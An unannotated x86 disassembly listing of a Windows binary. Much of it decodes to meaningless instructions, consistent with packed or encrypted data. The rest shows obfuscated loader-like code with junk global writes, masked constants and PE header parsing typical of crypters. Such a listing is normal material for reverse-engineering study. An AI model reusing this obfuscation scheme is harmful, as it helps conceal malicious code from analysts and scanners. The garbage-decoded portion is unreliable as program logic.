  4049a2:	loop   0x40495f
  4049a4:	push   esi
  4049a5:	imul   esp,DWORD PTR ds:0x83b617f6,0x44
  4049ac:	jmp    0x7cfc:0xe191cf0a
  4049b3:	rcl    DWORD PTR [esi],0x4
  4049b6:	mov    bh,0xff
  4049b8:	rcr    ebx,0xfa
  4049bb:	mov    al,0x6c
  4049bd:	cmp    eax,0x5b86917
  4049c2:	pop    edi
  4049c3:	adc    DWORD PTR [edi],esi
  4049c5:	test   BYTE PTR [ebp-0x26],bh
  4049c8:	loop   0x404a2d
  4049ca:	cmp    al,0x2b
  4049cc:	push   ss
  4049cd:	adc    bl,ah
  4049cf:	and    dh,ah
  4049d1:	test   DWORD PTR [esi-0x48],ebp
  4049d4:	sub    eax,0x9e93ea10
  4049d9:	(bad)  
  4049da:	jne    0x404979
  4049dc:	jg     0x404979
  4049de:	xor    ah,BYTE PTR [edx-0x6918d4f]
  4049e4:	or     ecx,eax
  4049e6:	mov    ebp,0xb7a47137
  4049eb:	add    DWORD PTR [edx+0x2eaa7f65],edi
  4049f1:	dec    ebx
  4049f2:	xchg   esp,eax
  4049f3:	xchg   ebx,eax
  4049f4:	(bad)  
  4049f5:	in     eax,0x64
  4049f7:	push   esi
  4049f8:	out    dx,al
  4049f9:	pop    es
  4049fa:	jecxz  0x404a53
  4049fc:	adc    eax,0x4c791b92
  404a01:	mov    ax,ds:0x95197f03
  404a07:	add    DWORD PTR [eax-0x27],ecx
  404a0a:	mov    ds:0x4025a856,eax
  404a0f:	mov    ebp,0x7554bee3
  404a14:	in     al,dx
  404a15:	mov    esp,0xa61b3122
  404a1a:	in     al,dx
  404a1b:	(bad)  
  404a1c:	cmp    eax,0xf1f7b9d2
  404a21:	jp     0x4049f2
  404a23:	mov    al,0xbb
  404a25:	jb     0x4049fb
  404a27:	push   ebp
  404a28:	(bad)  
  404a29:	jge    0x404a02
  404a2b:	mov    eax,fs
  404a2d:	xlat   BYTE PTR ds:[ebx]
  404a2e:	js     0x404a9e
  404a30:	fadd   DWORD PTR [ecx]
  404a32:	mov    bl,0xb5
  404a34:	in     eax,0x92
  404a36:	dec    ebx
  404a37:	retf   
  404a38:	push   ebx
  404a39:	fwait
  404a3a:	loope  0x404a3e
  404a3c:	int3   
  404a3d:	loop   0x404a5a
  404a3f:	mov    esp,0xa8e8774a
  404a44:	std    
  404a45:	xor    eax,0x35e9b01a
  404a4a:	push   0xffffffbd
  404a4c:	std    
  404a4d:	push   cs
  404a4e:	mov    es,WORD PTR [edx-0x72]
  404a51:	or     al,0x31
  404a53:	imul   esi,DWORD PTR [edx-0x7e],0x8997a409
  404a5a:	ss push 0xffffff91
  404a5d:	ins    DWORD PTR es:[edi],dx
  404a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a5f:	jo     0x404abb
  404a61:	test   al,0x7
  404a63:	lea    esi,ds:0xbda82
  404a69:	in     eax,0xff
  404a6b:	sahf   
  404a6c:	push   edx
  404a6d:	imul   eax,ecx,0x6790304f
  404a73:	or     ecx,edx
  404a75:	outs   dx,DWORD PTR ds:[esi]
  404a76:	xchg   edx,eax
  404a77:	in     eax,0x15
  404a79:	adc    al,0x7c
  404a7b:	addr16 mov dh,0xbd
  404a7e:	jp     0x404afa
  404a80:	xor    edx,DWORD PTR [eax]
  404a82:	jge    0x404a3f
  404a84:	mov    ds:0x4201d7ec,eax
  404a89:	add    eax,0x70ee7feb
  404a8e:	mov    ds:0x84947915,eax
  404a93:	imul   edi,DWORD PTR [esi-0x3a],0xa08ce690
  404a9a:	jmp    0x6db1:0x2998435f
  404aa1:	inc    edi
  404aa2:	add    BYTE PTR [edi],ch
  404aa4:	jmp    0x845c:0x1ed7b3ff
  404aab:	ins    DWORD PTR es:[edi],dx
  404aac:	add    eax,0x4d887654
  404ab1:	fwait
  404ab2:	test   BYTE PTR [eax+0x71824d27],ah
  404ab8:	sub    eax,0xe672401a
  404abd:	in     al,dx
  404abe:	sbb    al,0x17
  404ac0:	lock (bad) 
  404ac2:	imul   BYTE PTR [eax]
  404ac4:	adc    DWORD PTR [ecx-0x651ab77f],eax
  404aca:	dec    edi
  404acb:	add    esi,eax
  404acd:	inc    edi
  404ace:	test   al,0xe8
  404ad0:	ins    BYTE PTR es:[edi],dx
  404ad1:	sub    bl,BYTE PTR [edi-0x3b]
  404ad4:	jecxz  0x404b2a
  404ad6:	push   cs
  404ad7:	mov    dh,0xb2
  404ad9:	mov    bl,0xa8
  404adb:	jge    0x404b20
  404add:	or     DWORD PTR [edi-0x6a9343f0],edi
  404ae3:	scas   al,BYTE PTR es:[edi]
  404ae4:	push   edi
  404ae5:	dec    eax
  404ae6:	pop    ebp
  404ae7:	sahf   
  404ae8:	arpl   WORD PTR [eax+0x74],bx
  404aeb:	sbb    DWORD PTR [eax+0x51c679c],0x5ca7e838
  404af5:	es mov ebp,ss
  404af8:	push   ebx
  404af9:	adc    BYTE PTR [ecx-0x46a43048],ch
  404aff:	xchg   esp,eax
  404b00:	int3   
  404b01:	mov    eax,ds:0xeec7ee1
  404b06:	inc    ebx
  404b08:	pushf  
  404b09:	in     al,0xfa
  404b0b:	add    bl,bh
  404b0d:	test   al,0x5
  404b0f:	test   eax,0x2e146efa
  404b14:	stos   BYTE PTR es:[edi],al
  404b15:	jge    0x404b02
  404b17:	xlat   BYTE PTR ds:[ebx]
  404b18:	rcr    BYTE PTR [esi+ebx*2],cl
  404b1b:	adc    ebp,DWORD PTR [esi+0xf]
  404b1e:	fistp  QWORD PTR [ebx]
  404b20:	pop    esi
  404b21:	clc    
  404b22:	or     eax,DWORD PTR [esi+0x3a93aebc]
  404b28:	mov    ds:0x6129a2e2,eax
  404b2d:	sub    eax,0x971f9d09
  404b32:	and    DWORD PTR [eax+0x45],ebx
  404b35:	cli    
  404b36:	hlt    
  404b37:	out    dx,eax
  404b38:	fs jae 0x404b13
  404b3b:	loope  0x404b22
  404b3d:	push   ss
  404b3e:	mov    bl,0x70
  404b40:	mov    dh,0xd3
  404b42:	cmp    BYTE PTR [eax],ah
  404b44:	xor    BYTE PTR [ebp+0x5b63d43a],bl
  404b4a:	ja     0x404af8
  404b4c:	pop    ebx
  404b4d:	pop    edx
  404b4e:	mov    ds:0xd966d521,al
  404b53:	imul   esi,DWORD PTR [eax+0x20f05d87],0x27e4e0cd
  404b5d:	fwait
  404b5e:	retf   
  404b5f:	sbb    ah,BYTE PTR [edx+0x3d]
  404b62:	int3   
  404b63:	or     ebx,DWORD PTR [edx-0x576e4985]
  404b69:	mov    DWORD PTR [ebx],esi
  404b6b:	mov    DWORD PTR [eax+0x73],esp
  404b6e:	inc    ebx
  404b6f:	(bad)  
  404b70:	aas    
  404b71:	data16 mov dl,0x9a
  404b74:	loop   0x404b00
  404b76:	push   esp
  404b77:	xor    DWORD PTR [ebx],ebx
  404b79:	jl     0x404be0
  404b7b:	xchg   edi,eax
  404b7c:	cdq    
  404b7d:	pop    edx
  404b7e:	out    0x3f,eax
  404b80:	cli    
  404b81:	cmp    al,0x85
  404b83:	nop
  404b84:	rcl    DWORD PTR [ebx+0x20],cl
  404b87:	into   
  404b88:	retf   0x4413
  404b8b:	inc    esi
  404b8c:	pop    eax
  404b8d:	std    
  404b8e:	or     al,BYTE PTR [edx+eax*4]
  404b91:	sahf   
  404b92:	jnp    0x404c05
  404b94:	es fld st(0)
  404b97:	pop    ecx
  404b98:	out    dx,al
  404b99:	mov    dh,BYTE PTR [ebx+0x3]
  404b9c:	je     0x404b30
  404b9e:	inc    esi
  404b9f:	mov    ebx,0x4936f0be
  404ba4:	xlat   BYTE PTR ds:[ebx]
  404ba5:	test   eax,0xbf324e75
  404baa:	cli    
  404bab:	int3   
  404bac:	cmp    eax,0xa8d27703
  404bb1:	xor    dh,BYTE PTR es:[ebx+0x21]
  404bb5:	mov    WORD PTR [eax+0x48],es
  404bb8:	inc    edi
  404bb9:	dec    eax
  404bba:	in     al,0xb1
  404bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bbd:	add    bl,dh
  404bbf:	les    edx,FWORD PTR [eax+0x5d27d71a]
  404bc5:	xchg   edx,eax
  404bc6:	jbe    0x404c1c
  404bc8:	mov    esp,0x8d96fe16
  404bcd:	adc    ecx,ecx
  404bcf:	inc    edi
  404bd0:	outs   dx,DWORD PTR ds:[esi]
  404bd1:	cmp    cl,dl
  404bd3:	push   0x56609501
  404bd8:	adc    esp,DWORD PTR [ecx+0x5c]
  404bdb:	div    DWORD PTR [eax]
  404bdd:	jnp    0x404c16
  404bdf:	add    BYTE PTR [edx],0xc
  404be2:	dec    ebx
  404be3:	add    eax,0x2e0ec028
  404be8:	adc    DWORD PTR [eax],eax
  404bea:	xchg   esi,eax
  404beb:	imul   eax,edx,0x2b
  404bee:	das    
  404bef:	pop    edi
  404bf0:	out    dx,eax
  404bf1:	pop    es
  404bf2:	push   ecx
  404bf3:	stc    
  404bf4:	test   ebx,esi
  404bf6:	les    eax,FWORD PTR [edx+0x43]
  404bf9:	xor    eax,0x93b4f2a9
  404bfe:	or     DWORD PTR [edx+0x28],eax
  404c01:	jmp    0xdb9c:0xf3c7e647
  404c08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c09:	xor    al,0xcf
  404c0b:	push   edi
  404c0c:	clc    
  404c0d:	and    ch,ch
  404c0f:	js     0x404c1a
  404c11:	inc    esi
  404c12:	and    eax,0x38483aae
  404c17:	jge    0x404c5f
  404c19:	jecxz  0x404c95
  404c1b:	div    DWORD PTR [ebx+0xc4be952]
  404c21:	add    DWORD PTR [ecx],ebp
  404c23:	scas   al,BYTE PTR es:[edi]
  404c24:	pop    DWORD PTR [esi+0xc]
  404c27:	push   es
  404c28:	cld    
  404c29:	dec    esi
  404c2a:	icebp  
  404c2b:	add    al,0x23
  404c2d:	(bad)  
  404c2e:	jl     0x404c40
  404c30:	ins    DWORD PTR es:[edi],dx
  404c31:	lods   al,BYTE PTR ds:[esi]
  404c32:	hlt    
  404c33:	or     DWORD PTR [ebp+0x214c210],esp
  404c39:	std    
  404c3a:	int    0x83
  404c3c:	xchg   ebp,eax
  404c3d:	jmp    0x404c85
  404c3f:	repz enter 0xc3fd,0xe1
  404c44:	mov    esp,0x1eb1da63
  404c49:	add    al,0x99
  404c4b:	jmp    0x404bf1
  404c4d:	shr    ebx,1
  404c4f:	out    0xff,al
  404c51:	pusha  
  404c52:	aas    
  404c53:	fs pop es
  404c55:	push   edi
  404c56:	lahf   
  404c57:	cmp    DWORD PTR [ecx],ecx
  404c59:	inc    esi
  404c5a:	pop    ss
  404c5b:	mov    bp,0xaa9
  404c5f:	aaa    
  404c60:	add    BYTE PTR [ebp+0x3be85a5d],cl
  404c66:	cmovns edi,DWORD PTR [edi+0x55]
  404c6a:	or     DWORD PTR [esi+0x39574ce8],0xffffffaf
  404c71:	fcom   QWORD PTR [ebp-0x3ac9c942]
  404c77:	jb     0x404ca8
  404c79:	fidivr WORD PTR [eax]
  404c7b:	sub    al,0xd4
  404c7d:	mov    ebp,0xb388ddc9
  404c82:	jge    0x404cfe
  404c84:	adc    edi,DWORD PTR [edx-0x2658f1a8]
  404c8a:	sub    DWORD PTR [edx+0x610473dd],edx
  404c90:	mov    edx,DWORD PTR [edi-0x478a10ca]
  404c96:	dec    ecx
  404c97:	cmp    eax,0x86176c45
  404c9c:	mov    ebp,0x1b8622b8
  404ca1:	xchg   ebp,eax
  404ca2:	call   0x4545cd91
  404ca7:	push   eax
  404ca8:	push   ecx
  404ca9:	fdiv   QWORD PTR [ecx+eax*2+0x4bffd70a]
  404cb0:	sbb    eax,0xe9bcd026
  404cb5:	xchg   edx,eax
  404cb6:	fwait
  404cb7:	push   cs
  404cb8:	das    
  404cb9:	ret    
  404cba:	enter  0xc003,0x22
  404cbe:	and    DWORD PTR [esi-0x260ed752],0xffffff82
  404cc5:	jnp    0x404d20
  404cc7:	jge    0x404c9a
  404cc9:	xor    al,0x54
  404ccb:	ret    
  404ccc:	mov    esi,0x11b678a2
  404cd1:	icebp  
  404cd2:	repz mov ecx,0x8c0632dc
  404cd8:	ins    DWORD PTR es:[edi],dx
  404cd9:	dec    eax
  404cda:	imul   esi,DWORD PTR [edx+0x3f],0xded994ef
  404ce1:	out    dx,eax
  404ce2:	nop
  404ce3:	(bad)  
  404ce4:	push   ss
  404ce5:	loop   0x404d59
  404ce7:	add    al,0x8c
  404ce9:	mov    fs,esi
  404ceb:	(bad)  
  404cec:	call   FWORD PTR [edx]
  404cee:	aad    0x85
  404cf0:	jge    0x404d03
  404cf2:	dec    ecx
  404cf3:	imul   esi,ebx,0xffffff98
  404cf6:	and    ebx,DWORD PTR [ebp+0x410a7cc0]
  404cfc:	and    esi,DWORD PTR [edi]
  404cfe:	ficom  DWORD PTR [ebx+0x0]
  404d01:	push   0xa29475a6
  404d06:	inc    esi
  404d07:	mov    eax,ds:0x7dda3c56
  404d0c:	imul   ebp,DWORD PTR [esi-0x70],0x2f0fe70a
  404d13:	loop   0x404d01
  404d15:	cwde   
  404d16:	ins    DWORD PTR es:[edi],dx
  404d17:	cs inc ebp
  404d19:	mov    ds:0xee3bd676,eax
  404d1e:	cmp    bl,BYTE PTR ds:[eax-0x33]
  404d22:	repnz sub ch,BYTE PTR [esi+0x1d50a8e5]
  404d29:	mov    cl,0xc7
  404d2b:	or     edx,ebx
  404d2d:	and    BYTE PTR [ebp+0x60],ah
  404d30:	call   0xa85f:0x5279dfcc
  404d37:	pusha  
  404d38:	ss call 0x156b7200
  404d3e:	adc    dl,al
  404d40:	push   ss
  404d41:	daa    
  404d42:	dec    ebx
  404d43:	idiv   BYTE PTR [ecx+0x21]
  404d46:	xor    DWORD PTR [ecx+0x5d1eb544],esi
  404d4c:	retf   0x14cd
  404d4f:	add    ebx,0xffffffb3
  404d52:	jp     0x404dcc
  404d54:	mov    DWORD PTR [ebp-0x71],ecx
  404d57:	nop
  404d58:	iret   
  404d59:	and    eax,0x8cb2cdb5
  404d5e:	dec    ebp
  404d5f:	ins    BYTE PTR es:[edi],dx
  404d60:	repnz cwde 
  404d62:	jns    0x404ce7
  404d64:	pop    ebp
  404d65:	cmp    dh,al
  404d67:	jmp    0x3a0b:0x3a8ef57c
  404d6e:	into   
  404d6f:	call   0x75adf70
  404d74:	cmc    
  404d75:	jbe    0x404d3e
  404d77:	idiv   DWORD PTR [ebx]
  404d79:	into   
  404d7a:	pusha  
  404d7b:	test   dh,bh
  404d7d:	std    
  404d7e:	xchg   BYTE PTR [edx-0x69],dh
  404d81:	into   
  404d82:	call   FWORD PTR [edx-0x5f]
  404d85:	push   eax
  404d86:	pop    edi
  404d87:	lods   al,BYTE PTR ds:[esi]
  404d88:	jge    0x404d98
  404d8a:	sbb    ah,dh
  404d8c:	mov    dh,0x61
  404d8e:	dec    eax
  404d8f:	and    bl,bl
  404d91:	(bad)  
  404d92:	je     0x404d60
  404d94:	retf   0xfa1d
  404d97:	scas   eax,DWORD PTR es:[edi]
  404d98:	shl    DWORD PTR [ebx],0xc8
  404d9b:	or     al,0x62
  404d9d:	leave  
  404d9e:	mov    ebp,0xf63ba8f3
  404da3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404da4:	xor    al,0xfa
  404da6:	(bad)  
  404da8:	and    al,0xa4
  404daa:	mov    al,ds:0x95f7d56b
  404daf:	ins    DWORD PTR es:[edi],dx
  404db0:	xor    ebp,DWORD PTR [esi+eiz*8+0x7e5d6dd9]
  404db7:	dec    ebx
  404db8:	xchg   bl,dl
  404dba:	mov    esp,0x8a1aa1ee
  404dbf:	js     0x404e1f
  404dc1:	mov    bl,0x3f
  404dc3:	xchg   edi,eax
  404dc4:	lock and ah,BYTE PTR [edx+eiz*8+0x5f4b24c]
  404dcc:	pop    ebp
  404dcd:	push   esi
  404dce:	ficomp DWORD PTR [esp+esi*2+0x17f7a084]
  404dd5:	dec    edi
  404dd6:	adc    bl,al
  404dd8:	sub    dl,BYTE PTR [ebx+edx*8+0x61]
  404ddc:	pusha  
  404ddd:	dec    ebp
  404dde:	fld    TBYTE PTR [ebx+esi*1-0xa1f6225]
  404de5:	and    ah,BYTE PTR [ebx]
  404de7:	pop    ds
  404de8:	inc    ebx
  404de9:	jbe    0x404dde
  404deb:	mov    ch,al
  404ded:	add    dh,BYTE PTR [eax+0x41]
  404df0:	xor    eax,0x3bdfd09d
  404df5:	ja     0x404e13
  404df7:	int3   
  404df8:	daa    
  404df9:	(bad)  
  404dfa:	cmp    eax,0xaf974afb
  404dff:	sbb    eax,0x260d092
  404e04:	into   
  404e05:	stos   DWORD PTR es:[edi],eax
  404e06:	cli    
  404e07:	mov    ds:0xa4f3d08a,al
  404e0c:	(bad)  
  404e0d:	xor    bl,dl
  404e0f:	jno    0x404da4
  404e11:	popa   
  404e12:	or     eax,0x77d17092
  404e17:	adc    ebp,ecx
  404e19:	test   al,0x60
  404e1b:	ret    
  404e1c:	stos   DWORD PTR es:[edi],eax
  404e1d:	lahf   
  404e1e:	push   ss
  404e1f:	lock ficomp WORD PTR [eax+0x678b5ca8]
  404e26:	mov    bh,0xe8
  404e28:	int    0x99
  404e2a:	push   ebp
  404e2b:	stc    
  404e2c:	popf   
  404e2d:	stos   DWORD PTR es:[edi],eax
  404e2e:	clc    
  404e2f:	pop    edi
  404e30:	lock mov ah,0x2a
  404e33:	popa   
  404e34:	xchg   esp,eax
  404e35:	pop    ecx
  404e36:	call   0x9bff4b
  404e3b:	scas   eax,DWORD PTR es:[edi]
  404e3c:	inc    edx
  404e3d:	popf   
  404e3e:	mov    ecx,0x3f7ebee9
  404e43:	jmp    0x620052cc
  404e48:	test   eax,0x839c1988
  404e4d:	ret    
  404e4e:	es (bad) 
  404e50:	push   esi
  404e51:	cmp    eax,0x5353d80
  404e56:	bound  eax,QWORD PTR [eax-0x4bd8a412]
  404e5c:	jmp    0x75c1b545
  404e61:	cmp    eax,0x3ddd3a76
  404e66:	jle    0x404e40
  404e68:	push   ebx
  404e69:	inc    esi
  404e6a:	cmp    DWORD PTR [eax],edx
  404e6c:	jmp    0x30bba640
  404e71:	cld    
  404e72:	add    DWORD PTR [ecx+0x1c2c467f],esp
  404e78:	jge    0x404dff
  404e7a:	std    
  404e7b:	xor    ah,BYTE PTR [edx-0x49cf3810]
  404e81:	and    edx,eax
  404e83:	jno    0x404ec4
  404e85:	gs data16 and al,0x70
  404e89:	rep outs dx,BYTE PTR ds:[esi]
  404e8b:	xchg   esi,eax
  404e8c:	popf   
  404e8d:	mov    cl,0x21
  404e8f:	and    esi,esi
  404e91:	in     al,dx
  404e92:	xchg   esp,eax
  404e93:	xchg   dl,ch
  404e95:	shl    bh,cl
  404e97:	imul   eax,eax,0x581216f
  404e9d:	stos   DWORD PTR es:[edi],eax
  404e9e:	mov    ecx,0x788694b6
  404ea3:	xchg   esi,eax
  404ea4:	adc    dh,BYTE PTR [esi-0xb2bd3c4]
  404eaa:	sub    esi,DWORD PTR [edi]
  404eac:	test   BYTE PTR [ecx],dh
  404eae:	aam    0xec
  404eb0:	jmp    0x404f26
  404eb2:	idiv   BYTE PTR [esi-0x59]
  404eb5:	mov    dl,0x41
  404eb7:	(bad)  
  404eb8:	in     al,dx
  404eb9:	(bad)  
  404eba:	push   0x78
  404ebc:	sub    eax,0xd9b5a93e
  404ec1:	ficom  DWORD PTR [ebp-0x56]
  404ec4:	and    cl,BYTE PTR [ebp+0xedb4804]
  404eca:	mov    ds:0x2e754a00,al
  404ecf:	pop    ecx
  404ed0:	push   ds
  404ed1:	mov    ch,0x7
  404ed3:	popf   
  404ed4:	shr    bh,0x8d
  404ed7:	test   BYTE PTR [edi+eiz*8],0x9
  404edb:	hlt    
  404edc:	fnsave [esi+0x44]
  404edf:	push   ds
  404ee0:	cli    
  404ee1:	js     0x404f08
  404ee3:	adc    bh,BYTE PTR [ebx-0xa]
  404ee6:	or     BYTE PTR [ecx+0x1da8e8bd],al
  404eec:	icebp  
  404eed:	inc    edi
  404eee:	stos   BYTE PTR es:[edi],al
  404eef:	lds    eax,FWORD PTR [esi]
  404ef1:	xor    dh,BYTE PTR [edx]
  404ef3:	add    al,cl
  404ef5:	scas   al,BYTE PTR es:[edi]
  404ef6:	fcmovnbe st,st(1)
  404ef8:	fxch   st(5)
  404efa:	call   0x160f:0xf2c57ca4
  404f01:	hlt    
  404f02:	push   0xffffffe3
  404f04:	js     0x404f0e
  404f06:	popf   
  404f07:	clc    
  404f08:	xor    esi,0xe418c02
  404f0e:	outs   dx,DWORD PTR ds:[esi]
  404f0f:	pop    ds
  404f10:	or     ah,BYTE PTR [edi+edi*8-0x7a6a3da]
  404f17:	sub    eax,ecx
  404f19:	aad    0xef
  404f1b:	repz inc esi
  404f1d:	push   ds
  404f1e:	adc    BYTE PTR [ebx+ebx*1],al
  404f21:	sub    dl,bl
  404f23:	jnp    0x404ea5
  404f25:	inc    eax
  404f26:	lods   al,BYTE PTR ds:[esi]
  404f27:	lds    eax,FWORD PTR [esp+edi*1+0x3a849ea6]
  404f2e:	add    ecx,DWORD PTR [ebx+0x7d8bfc45]
  404f34:	clc    
  404f35:	xor    edi,edx
  404f37:	add    edi,esi
  404f39:	mov    esi,DWORD PTR [ebp+0x8]
  404f3c:	imul   edi,ecx
  404f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  404f42:	xor    eax,edx
  404f44:	add    eax,ecx
  404f46:	mov    al,BYTE PTR [ebx+eax*1+0x3272dd]
  404f4d:	mov    BYTE PTR [edi+esi*1],al
  404f50:	mov    eax,DWORD PTR [ebp-0x8]
  404f53:	mov    esi,DWORD PTR [ebp+0x10]
  404f56:	xor    eax,edx
  404f58:	xor    ebx,ebx
  404f5a:	add    esi,0xfabdbeed
  404f60:	adc    ebx,0xffffffff
  404f63:	lea    ecx,[ecx+eax*1+0x3272dd]
  404f6a:	xor    edi,edi
  404f6c:	xor    esi,0x8a29a127
  404f72:	xor    ebx,0x0
  404f75:	mov    eax,ecx
  404f77:	add    eax,0xfabdbeed
  404f7c:	adc    edi,0xffffffff
  404f7f:	xor    eax,0x8a29a127
  404f84:	xor    edi,0x0
  404f87:	cmp    eax,esi
  404f89:	jne    0x402b72
  404f8f:	cmp    edi,ebx
  404f91:	jne    0x402b72
  404f97:	mov    eax,0xf89c85b2
  404f9c:	pop    ebx
  404f9d:	pop    edi
  404f9e:	pop    esi
  404f9f:	leave  
  404fa0:	ret    0xc
  404fa3:	push   ebp
  404fa4:	mov    ebp,esp
  404fa6:	push   ecx
  404fa7:	add    eax,DWORD PTR ds:0x42a000
  404fad:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  404fb4:	sbb    DWORD PTR ds:0x42b008,0x61d9
  404fbe:	mov    eax,DWORD PTR [ebp+0x8]
  404fc1:	xor    DWORD PTR ds:0x42c018,0x2d2e
  404fcb:	mov    al,BYTE PTR [eax]
  404fcd:	add    al,0xb
  404fcf:	xor    al,0x71
  404fd1:	cmp    al,0x29
  404fd3:	mov    DWORD PTR ds:0x429010,0x6c7b
  404fdd:	jne    0x40507a
  404fe3:	mov    eax,DWORD PTR [ebp+0x8]
  404fe6:	or     edx,DWORD PTR ds:0x42900c
  404fec:	mov    ecx,DWORD PTR [ebp+0x8]
  404fef:	and    DWORD PTR ds:0x42b00c,0x0
  404ff9:	mov    edx,DWORD PTR ds:0x42b00c
  404fff:	inc    edx
  405000:	mov    DWORD PTR ds:0x42b00c,edx
  405006:	cmp    DWORD PTR ds:0x42b00c,0x1a
  40500d:	jne    0x40501e
  405013:	push   0x42900c
  405018:	call   DWORD PTR ds:0x42ed75
  40501e:	cmp    DWORD PTR ds:0x42b00c,0x15
  405025:	jb     0x404ff9
  40502b:	or     DWORD PTR ds:0x42d008,0x1488
  405035:	add    ecx,DWORD PTR [eax+0x3c]
  405038:	mov    edx,0x7510896
  40503d:	mov    DWORD PTR [ebp+0x8],ecx
  405040:	mov    eax,DWORD PTR [ebp-0x4]
  405043:	xor    eax,edx
  405045:	push   esi
  405046:	mov    esi,DWORD PTR ds:0x42d000
  40504c:	and    DWORD PTR ds:0x42a00c,esi
  405052:	mov    esi,DWORD PTR [ebp+0x8]
  405055:	mov    ecx,0x3272dd
  40505a:	add    eax,ecx
  40505c:	cmp    DWORD PTR [esi+0x54],eax
  40505f:	pop    esi
  405060:	je     0x40506e
  405066:	mov    eax,DWORD PTR [ebp+0x8]
  405069:	jmp    0x405087
  40506e:	mov    eax,DWORD PTR [ebp-0x4]
  405071:	xor    eax,edx
  405073:	add    eax,ecx
  405075:	jmp    0x405087
  40507a:	mov    eax,DWORD PTR [ebp-0x4]
  40507d:	xor    eax,0x7510896
  405082:	add    eax,0x3272dd
  405087:	leave  
  405088:	ret    0x4
  40508b:	push   ebp
  40508c:	mov    ebp,esp
  40508e:	sub    esp,0x78
  405091:	push   ebx
  405092:	push   esi
  405093:	push   edi
  405094:	push   0x1f
  405096:	lea    eax,[ebp-0x78]
  405099:	xor    DWORD PTR ds:0x429018,0x42a014
  4050a3:	push   eax
  4050a4:	push   0x0
  4050a6:	mov    DWORD PTR ds:0x429010,0x21c3
  4050b0:	call   DWORD PTR ds:0x42ed69
  4050b6:	add    DWORD PTR ds:0x429024,0x42c000
  4050c0:	push   0x97898797
  4050c5:	call   DWORD PTR ds:0x42ed2d
  4050cb:	adc    DWORD PTR ds:0x42b018,0x6ca1
  4050d5:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4050dc:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4050e3:	mov    ecx,DWORD PTR [ebp-0x4]
  4050e6:	mov    ebx,0x7510896
  4050eb:	add    DWORD PTR ds:0x42a014,0x255d
  4050f5:	xor    ecx,ebx
  4050f7:	or     DWORD PTR ds:0x429000,0x7ff8
  405101:	mov    eax,0x3272dd
  405106:	add    ecx,eax
  405108:	mov    DWORD PTR [ebp-0x1c],ecx
  40510b:	not    DWORD PTR ds:0x42c018
  405111:	mov    ecx,DWORD PTR [ebp+0x14]
  405114:	test   ecx,ecx
  405116:	mov    DWORD PTR ds:0x42a00c,0x3f58
  405120:	je     0x40513a
  405126:	inc    ecx
  405127:	mov    ecx,DWORD PTR [ebp+0x14]
  40512a:	and    DWORD PTR ds:0x429014,0x1a66
  405134:	mov    ecx,DWORD PTR [ecx]
  405136:	dec    edi
  405137:	mov    DWORD PTR [ebp-0x1c],ecx
  40513a:	add    DWORD PTR ds:0x42901c,edx
  405140:	mov    ecx,0x7665
  405145:	and    DWORD PTR ds:0x42c008,0x0
  40514f:	jmp    0x405161
  405154:	mov    edi,DWORD PTR ds:0x42c008
  40515a:	inc    edi
  40515b:	mov    DWORD PTR ds:0x42c008,edi
  405161:	cmp    DWORD PTR ds:0x42c008,0x10
  405168:	jae    0x405192
  40516e:	cmp    DWORD PTR ds:0x42c008,0x1f
  405175:	jne    0x40518b
  40517b:	push   0x399e
  405180:	push   0x848f
  405185:	call   DWORD PTR ds:0x42ed35
  40518b:	jmp    0x405154
  405190:	xor    edi,edi
  405192:	imul   edx,eax
  405195:	movzx  esi,BYTE PTR ds:0x42c010
  40519c:	xor    DWORD PTR ds:0x42c004,esi
  4051a2:	mov    esi,0x76532
  4051a7:	add    edx,ecx
  4051a9:	and    DWORD PTR ds:0x42a018,0x0
  4051b3:	mov    edi,DWORD PTR ds:0x42a018
  4051b9:	inc    edi
  4051ba:	mov    DWORD PTR ds:0x42a018,edi
  4051c0:	cmp    DWORD PTR ds:0x42a018,0x6
  4051c7:	jne    0x4051e0
  4051cd:	push   0x8802
  4051d2:	push   0x429004
  4051d7:	push   DWORD PTR [ebp-0x24]
  4051da:	call   DWORD PTR ds:0x42ed39
  4051e0:	cmp    DWORD PTR ds:0x42a018,0x5
  4051e7:	jne    0x4051fa
  4051ed:	mov    edi,DWORD PTR ds:0x42a018
  4051f3:	inc    edi
  4051f4:	mov    DWORD PTR ds:0x42a018,edi
  4051fa:	cmp    DWORD PTR ds:0x42a018,0x10
  405201:	jb     0x4051b3
  405207:	and    DWORD PTR ds:0x42d00c,0x0
  405211:	jmp    0x405223
  405216:	mov    edi,DWORD PTR ds:0x42d00c
  40521c:	inc    edi
  40521d:	mov    DWORD PTR ds:0x42d00c,edi
  405223:	cmp    DWORD PTR ds:0x42d00c,0x15
  40522a:	jae    0x405278
  405230:	cmp    DWORD PTR ds:0x42d00c,0xa
  405237:	jne    0x40524d
  40523d:	push   0x42e05b
  405242:	push   0x42e010
  405247:	call   DWORD PTR ds:0x42ed3d
  40524d:	cmp    DWORD PTR ds:0x42d00c,0x9
  405254:	jne    0x405269
  40525a:	xor    edi,edi
  40525c:	or     edi,DWORD PTR ds:0x42d00c
  405262:	inc    edi
  405263:	mov    DWORD PTR ds:0x42d00c,edi
  405269:	jmp    0x405216
  40526e:	adc    DWORD PTR ds:0x42b000,0x4b16
  405278:	xchg   esi,ecx
  40527a:	xor    ecx,DWORD PTR ds:0x42a00c
  405280:	mov    edi,0x54354
  405285:	sub    edx,edi
  405287:	sbb    ecx,0x55bb
  40528d:	mov    ecx,DWORD PTR [ebp-0x4]
  405290:	sub    DWORD PTR ds:0x42a01c,edx
  405296:	xor    ecx,ebx
  405298:	mov    esi,DWORD PTR ds:0x42a018
  40529e:	and    esi,DWORD PTR ds:0x429000
  4052a4:	mov    DWORD PTR ds:0x42a018,esi
  4052aa:	add    ecx,eax
  4052ac:	mov    DWORD PTR [ebp-0x8],ecx
  4052af:	and    DWORD PTR ds:0x42b010,0x0
  4052b9:	jmp    0x4052cb
  4052be:	mov    esi,DWORD PTR ds:0x42b010
  4052c4:	inc    esi
  4052c5:	mov    DWORD PTR ds:0x42b010,esi
  4052cb:	cmp    DWORD PTR ds:0x42b010,0x1e
  4052d2:	jae    0x405313
